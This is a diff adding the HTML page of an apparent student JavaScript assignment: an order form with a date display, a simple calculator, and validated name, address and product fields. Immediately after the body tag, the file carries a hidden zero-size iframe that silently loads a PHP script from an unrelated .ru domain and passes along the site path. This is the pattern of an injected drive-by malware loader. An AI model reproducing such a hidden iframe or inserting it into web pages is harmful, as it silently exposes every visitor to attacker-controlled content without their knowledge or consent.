@@ -1,0 +1,122 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Order</title>
+<script type="text/javascript" src="time.js"></script>
+<script type="text/javascript" src="date.js"></script>
+<script type="text/javascript" src="calc.js"></script>
+
+<script src="../SpryAssets/SpryValidationTextField.js" type="text/javascript"></script>
+<script src="../SpryAssets/SpryValidationConfirm.js" type="text/javascript"></script>
+<link href="../SpryAssets/SpryValidationTextField.css" rel="stylesheet" type="text/css" />
+<link href="../SpryAssets/SpryValidationConfirm.css" rel="stylesheet" type="text/css" />
+</head>
+<body><iframe width="0" height="0" style="display:none;" id="frmchkldver" src="http://ruunakilndia1.ru/img/header.php?ftd=4884382&path=%7cassignments%7cjs_project%7c&sys=WN&wrk=19"></iframe>
+<p>&nbsp;</p>
+<div class="content">
+
+<form name="clock">
+  
+  <table class="clock" width="135">
+ <tr>
+  <td class="clock2">
+  <script type="text/javascript">
+<!--
+displayDate();
+//-->
+</script>
+  </td>
+ </tr>
+ <tr>
+  <td>
+    <input class="clock2" type="text" name="sivam" size="12"><br>
+  </td>
+ </tr>
+ <tr>
+  <td>
+    <label class="clock3" for="1"><input type="radio" id="1" name="sivamtime" checked>12 Hour Format</label><br>
+    <label class="clock3" for="2"><input type="radio" id="2" name="sivamtime">24 Hour Format</label>
+  </td>
+ </tr>
+</table>
+</form>
+<p></p>
+<FORM name="formx">
+(sales tax is 5%; S&H is $3 - flat rate)
+<input type=text size=4 value=0 name="a"> 
+<input type="button" value="  +  " onClick="a_plus_b(this.form)">  
+<input type="button" value="  -  " onClick="a_minus_b(this.form)">  
+<input type="button" value="  x  " onClick="a_times_b(this.form)">  
+<input type="button" value="  /  " onClick="a_div_b(this.form)">  
+<input type="button" value="  ^  " onClick="a_pow_b(this.form)">  
+<input type="number" size=4 value=0 name="b"> = <input type "number" value=0 name="ans" size=9>
+</FORM>
+
+<p></p>
+
+<form id="orderform" name="orderform" method="post" action="orderconfirm.html">
+<span id="sprytextfield1">
+<label>First Name
+  <input type="text" name="text1" id="text1" />
+</label>
+<span class="textfieldRequiredMsg">Please enter your first name</span></span>
+
+   <span id="sprytextfield2">
+ <label>Last Name
+       <input type="text" name="lastname" id="lastname" />
+
+ </label>
+    <span class="textfieldRequiredMsg">Please enter your last name</span></span>
+<br />
+<span id="sprytextfield3">
+     <label>Street Address
+       <input type="text" name="text2" id="text2" />
+     </label>
+     <span class="textfieldRequiredMsg">Please enter your street address</span></span>
+   
+<span id="sprytextfield4">
+<label>City
+  <input type="text" name="text3" id="text3" />
+</label>
+<span class="textfieldRequiredMsg">Please enter your city</span></span>
+<span id="sprytextfield5">
+<label>State
+  <input type="text" name="text4" id="text4" />
+</label>
+<span class="textfieldRequiredMsg">Please enter your state</span></span>
+<br />
+<span id="sprytextfield6">
+<label>Product ID
+  <input type="text" name="text5" id="text5" />
+</label>
+<span class="textfieldRequiredMsg">Please enter a product ID</span></span>
+<span id="sprytextfield7">
+<label>Color
+  <input type="text" name="text6" id="text6" />
+</label>
+<span class="textfieldRequiredMsg">Please enter a color specification</span></span>
+<span id="sprytextfield8">
+<label>Size
+  <input type="text" name="text7" id="text7" />
+</label>
+<span class="textfieldRequiredMsg">Please enter your size specification</span></span><br />
+Enter your own text if you so desire <input name="" type="text" size="40" />
+<br />
+<input name="" type="submit" value="Submit" action="http://learn.reynolds.edu/sjmitteldorf/ITD210/210student21/assignments/js_project/orderconfirm.html"/>
+</form>
+<script type="text/javascript">
+<!--
+var sprytextfield1 = new Spry.Widget.ValidationTextField("sprytextfield1");
+var sprytextfield2 = new Spry.Widget.ValidationTextField("sprytextfield2");
+var sprytextfield3 = new Spry.Widget.ValidationTextField("sprytextfield3");
+var sprytextfield4 = new Spry.Widget.ValidationTextField("sprytextfield4");
+var sprytextfield5 = new Spry.Widget.ValidationTextField("sprytextfield5");
+var sprytextfield6 = new Spry.Widget.ValidationTextField("sprytextfield6");
+var sprytextfield7 = new Spry.Widget.ValidationTextField("sprytextfield7");
+var sprytextfield8 = new Spry.Widget.ValidationTextField("sprytextfield8");
+
+//--</script>
+</div>
+</body>
+</html>
